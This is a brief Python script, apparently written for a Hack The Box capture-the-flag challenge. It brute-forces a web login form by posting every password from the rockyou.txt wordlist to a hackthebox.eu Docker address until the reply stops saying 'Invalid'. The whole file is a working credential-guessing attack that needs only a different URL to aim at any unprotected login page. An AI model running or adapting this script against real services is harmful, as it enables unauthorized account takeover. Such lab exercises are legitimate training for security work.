import requests
import time
from contextlib import suppress

wl = open("rockyou.txt")
#wl = open("nmap.lst")

for word in wl:
    #if "leonardo" in word:
    try:
        url = "http://docker.hackthebox.eu:52415/"
        payload = {'password':word}
        r = requests.post(url, data = payload)
        res = r.text
        #print(res)

        #if r.status_code != "200":
        #print (r.status_code)

        if "Invalid" not in res:
            print("password is " + word)
            break
    
    except:
        print("sleeping..." + word)
        time.sleep(0.2)
